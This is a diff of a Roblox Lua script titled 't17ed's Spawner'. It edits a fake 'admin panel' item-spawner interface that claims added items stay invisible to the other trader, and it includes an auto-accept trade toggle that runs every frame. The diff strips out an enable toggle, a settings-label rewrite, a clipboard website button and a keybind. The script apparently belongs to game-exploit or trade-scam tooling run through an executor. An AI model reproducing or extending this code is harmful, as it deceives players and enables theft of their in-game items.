@@ -45,7 +45,6 @@ local strokeClickedColor = Color3.fromRGB(15,255,15)
 local adminPanels = {}
 local pendingPanel = nil
 local autoAccept = false
-local scriptEnabled = true
 
 -- PRESETS
 local presets = {
@@ -104,26 +103,6 @@ failSound.Parent = warningTemplate
 -- DESCRIPTION
 description.Text =
 	"The other player will not see this item in the trade but will still receive the item. Do you still want to add this item to the trade?"
-
--- SETTINGS TEXT CHANGE
-task.spawn(function()
-	while true do
-		pcall(function()
-			local functionText =
-				playerGui
-				:WaitForChild("Settings")
-				:WaitForChild("Settings")
-				:WaitForChild("Content")
-				:WaitForChild("ScrollingFrame")
-				:WaitForChild("VFX")
-				:WaitForChild("Function")
-
-			functionText.Text = "Gamepass Trading"
-		end)
-
-		task.wait(1)
-	end
-end)
 
 -- HIDE SELECTIONS
 local function hideSelections()
@@ -223,10 +202,6 @@ end)
 
 -- CREATE PANEL
 local function createAdminPanel(preset)
-	if not scriptEnabled then
-		return
-	end
-
 	local clone = template:Clone()
 	clone.Name = "AdminPanel"
 	clone.Parent = scrollingFrame
@@ -333,10 +308,6 @@ end
 
 -- REMOVE PANEL
 local function removePreset(name)
-	if not scriptEnabled then
-		return
-	end
-
 	for i = #adminPanels,1,-1 do
 		local panel = adminPanels[i]
 
@@ -399,14 +370,12 @@ end)
 local gui = Instance.new("ScreenGui")
 gui.Name = "SpawnerUI"
 gui.ResetOnSpawn = false
-gui.DisplayOrder = 999999
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 gui.Parent = playerGui
 
 local frame = Instance.new("Frame")
 frame.Parent = gui
-frame.Size = UDim2.new(0,320,0,345)
-frame.Position = UDim2.new(0.5,-160,0.5,-172)
+frame.Size = UDim2.new(0,320,0,300)
+frame.Position = UDim2.new(0.5,-160,0.5,-150)
 frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
 frame.BorderSizePixel = 0
 
@@ -432,7 +401,7 @@ topCorner.Parent = topBar
 local title = Instance.new("TextLabel")
 title.Parent = topBar
 title.BackgroundTransparency = 1
-title.Size = UDim2.new(1,-100,1,0)
+title.Size = UDim2.new(1,-40,1,0)
 title.Position = UDim2.new(0,10,0,0)
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.Text = "t17ed's Spawner"
@@ -440,33 +409,6 @@ title.Font = Enum.Font.GothamBold
 title.TextSize = 18
 title.TextColor3 = Color3.new(1,1,1)
 
--- ENABLE TOGGLE
-local enableButton = Instance.new("TextButton")
-enableButton.Parent = topBar
-enableButton.Size = UDim2.new(0,30,0,30)
-enableButton.Position = UDim2.new(1,-70,0.5,-15)
-enableButton.Text = "✓"
-enableButton.Font = Enum.Font.GothamBold
-enableButton.TextSize = 18
-enableButton.TextColor3 = Color3.new(1,1,1)
-enableButton.BackgroundColor3 = Color3.fromRGB(20,90,20)
-
-local enableCorner = Instance.new("UICorner")
-enableCorner.Parent = enableButton
-
-enableButton.MouseButton1Click:Connect(function()
-	scriptEnabled = not scriptEnabled
-
-	if scriptEnabled then
-		enableButton.Text = "✓"
-		enableButton.BackgroundColor3 = Color3.fromRGB(20,90,20)
-	else
-		enableButton.Text = "✕"
-		enableButton.BackgroundColor3 = Color3.fromRGB(90,20,20)
-	end
-end)
-
--- MINIMIZE
 local minimize = Instance.new("TextButton")
 minimize.Parent = topBar
 minimize.Size = UDim2.new(0,30,0,30)
@@ -484,7 +426,7 @@ local buttonsHolder = Instance.new("Frame")
 buttonsHolder.Parent = frame
 buttonsHolder.BackgroundTransparency = 1
 buttonsHolder.Position = UDim2.new(0,10,0,50)
-buttonsHolder.Size = UDim2.new(1,-20,0,200)
+buttonsHolder.Size = UDim2.new(1,-20,1,-90)
 
 -- GRID
 local grid = Instance.new("UIGridLayout")
@@ -511,7 +453,6 @@ for _,preset in ipairs(presets) do
 	counter.Position = UDim2.new(1,-4,0,4)
 	counter.Size = UDim2.new(0,24,0,24)
 	counter.BackgroundColor3 = Color3.fromRGB(15,15,15)
-	counter.BackgroundTransparency = 0.5
 	counter.TextColor3 = Color3.new(1,1,1)
 	counter.Font = Enum.Font.GothamBold
 	counter.TextSize = 14
@@ -530,16 +471,16 @@ for _,preset in ipairs(presets) do
 	label.TextSize = 12
 	label.TextColor3 = Color3.new(1,1,1)
 
-	local function flash(color)
+	local function flash()
 		local tween1 = TweenService:Create(
 			button,
-			TweenInfo.new(0.08),
-			{BackgroundColor3 = color}
+			TweenInfo.new(0.1),
+			{BackgroundColor3 = Color3.fromRGB(0,180,0)}
 		)
 
 		local tween2 = TweenService:Create(
 			button,
-			TweenInfo.new(0.08),
+			TweenInfo.new(0.1),
 			{BackgroundColor3 = Color3.fromRGB(40,40,40)}
 		)
 
@@ -550,12 +491,11 @@ for _,preset in ipairs(presets) do
 
 	button.MouseButton1Click:Connect(function()
 		createAdminPanel(preset)
-		flash(Color3.fromRGB(0,255,0))
+		flash()
 	end)
 
 	button.MouseButton2Click:Connect(function()
 		removePreset(preset.Name)
-		flash(Color3.fromRGB(255,60,60))
 	end)
 
 	RunService.Heartbeat:Connect(function()
@@ -567,7 +507,7 @@ end
 local toggle = Instance.new("TextButton")
 toggle.Parent = frame
 toggle.Size = UDim2.new(0,180,0,35)
-toggle.Position = UDim2.new(0.5,-90,1,-80)
+toggle.Position = UDim2.new(0.5,-90,1,-45)
 toggle.Text = "Autoaccept: OFF"
 toggle.Font = Enum.Font.GothamBold
 toggle.TextSize = 16
@@ -589,93 +529,21 @@ toggle.MouseButton1Click:Connect(function()
 	end
 end)
 
--- WEBSITE BUTTON
-local website = Instance.new("TextButton")
-website.Parent = frame
-website.Size = UDim2.new(0,180,0,25)
-website.Position = UDim2.new(0.5,-90,1,-40)
-website.BackgroundTransparency = 1
-website.Text = "t17ed.github.io"
-website.Font = Enum.Font.Gotham
-website.TextSize = 15
-website.TextColor3 = Color3.fromRGB(170,170,170)
-
-website.MouseButton1Click:Connect(function()
-	pcall(function()
-		if setclipboard then
-			setclipboard("https://t17ed.github.io")
-		end
-	end)
-
-	local tween1 = TweenService:Create(
-		website,
-		TweenInfo.new(0.1),
-		{
-			TextColor3 = Color3.fromRGB(255,255,0)
-		}
-	)
-
-	local tween2 = TweenService:Create(
-		website,
-		TweenInfo.new(0.1),
-		{
-			TextColor3 = Color3.fromRGB(170,170,170)
-		}
-	)
-
-	tween1:Play()
-	tween1.Completed:Wait()
-	tween2:Play()
-
-	showNotification(
-		"Copied to clipboard!",
-		Color3.fromRGB(255,255,0)
-	)
-end)
-
 -- MINIMIZE
 local minimized = false
 
 minimize.MouseButton1Click:Connect(function()
 	minimized = not minimized
 
+	buttonsHolder.Visible = not minimized
+	toggle.Visible = not minimized
+
 	if minimized then
+		frame.Size = UDim2.new(0,320,0,45)
 		minimize.Text = "+"
-
-		TweenService:Create(
-			frame,
-			TweenInfo.new(0.2,Enum.EasingStyle.Quint),
-			{
-				Size = UDim2.new(0,320,0,45)
-			}
-		):Play()
-
-		buttonsHolder.Visible = false
-		toggle.Visible = false
-		website.Visible = false
 	else
+		frame.Size = UDim2.new(0,320,0,300)
 		minimize.Text = "-"
-
-		buttonsHolder.Visible = true
-		toggle.Visible = true
-		website.Visible = true
-
-		TweenService:Create(
-			frame,
-			TweenInfo.new(0.2,Enum.EasingStyle.Quint),
-			{
-				Size = UDim2.new(0,320,0,345)
-			}
-		):Play()
-	end
-end)
-
--- KEYBIND
-UIS.InputBegan:Connect(function(input,gpe)
-	if gpe then return end
-
-	if input.KeyCode == Enum.KeyCode.Backquote then
-		gui.Enabled = not gui.Enabled
 	end
 end)
 
@@ -765,10 +633,6 @@ end
 
 RunService.Heartbeat:Connect(function()
 	if not autoAccept then
-		return
-	end
-
-	if not scriptEnabled then
 		return
 	end
 
